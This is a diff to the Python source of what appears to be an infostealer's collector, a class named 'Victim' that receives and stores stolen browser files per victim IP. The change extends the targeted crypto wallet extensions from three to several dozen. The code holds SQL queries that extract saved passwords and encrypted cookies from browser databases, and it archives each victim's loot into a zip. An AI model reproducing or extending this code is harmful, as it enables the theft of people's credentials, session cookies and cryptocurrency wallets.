@@ -7,8 +7,8 @@ import shutil
 
 class Victim():
     """class for handling victims"""
-    __BROWSERDATA = {"HASH": "KEY", "Login Data": "LOGIN.DB", "Cookies": "COOKIES.DB"}
-    __EXTENTIONDATA = {"a": "METAMASK", "b": "TRUST WALLER", "c": "AUTHENTICATOR"}
+    __BROWSERDATA = {"ZERO": "KEY", "ONE": "LOGIN.DB", "TWO": "COOKIES.DB"}
+    __EXTENTIONDATA = {'a': 'METAMASK', 'b': 'METAMASK', 'c': 'BINANCE', 'd': 'COINBASE', 'e': 'RONIN', 'f': 'TRUST', 'g': 'VENOM', 'h': 'SUI', 'i': 'MARTIAN', 'j': 'TRON', 'k': 'PETRA', 'l': 'PONTEM', 'm': 'FEWCHA', 'n': 'MATH', 'o': 'COIN98', 'p': 'AUTHENTICATOR', 'q': 'EXODUSWEB3', 'r': 'PHANTOM', 's': 'CORE', 't': 'TOKENPOCKET', 'u': 'SAFEPAL', 'v': 'SOLFARE', 'w': 'KAIKAS', 'x': 'IWALLET', 'y': 'YOROI', 'z': 'GUARDA', 'A': 'JAXX_LIBERTY', 'B': 'WOMBAT', 'C': 'OXYGEN', 'D': 'MEWCX', 'E': 'GUILD', 'F': 'SATURN', 'G': 'TERRASTATION', 'H': 'HARMONYOUTDATED', 'I': 'EVER', 'J': 'KARDIACHAIN', 'K': 'PALIWALLET', 'L': 'BOLTX', 'M': 'LIQUALITY', 'N': 'XDEFI', 'O': 'NAMI', 'P': 'MAIARDEFI', 'Q': 'TEMPLETEZOS', 'R': 'XMR_PT'}
     __StorageFile = "storage.json"
     PasswordsQuery = "SELECT origin_url, username_value, password_value FROM logins"
     CookiesQuery = "SELECT host_key, path, is_httponly, expires_utc, name, encrypted_value FROM cookies"
@@ -55,9 +55,9 @@ class Victim():
         then log it to the storage file.
         """
         FilePath = ""
-
+        print(f"file {type(FileName)}")
         if FileName in self.__BROWSERDATA:
-            if FileName == "HASH":
+            if FileName == "ZERO":
                 self.CurrentVictim["BrowserCount"] += 1
                 self.CurrentVictim["browsers"].append({"extentions": {}, "browserfiles": []})
             self.__VictimFolder = os.path.join(self.ip, str(self.CurrentVictim["BrowserCount"]))
@@ -66,7 +66,7 @@ class Victim():
             FilePath = os.path.join(self.__VictimFolder, self.__BROWSERDATA[FileName])
             self.LogFile(self.__BROWSERDATA[FileName], None)
 
-        if FileName[0] in self.__EXTENTIONDATA:
+        elif FileName[0] in self.__EXTENTIONDATA:
             FileAndDir = FileName.split("\\")
             DirName = self.__EXTENTIONDATA[FileAndDir[0]]
             FileName = FileAndDir[1]
@@ -170,6 +170,6 @@ class Victim():
         """
         shutil.make_archive(self.ip, 'zip', self.ip)
         return self.ip + ".zip"
-    
+
     def RemoveVictimZip(self) -> None:
         os.remove(self.ip + ".zip")
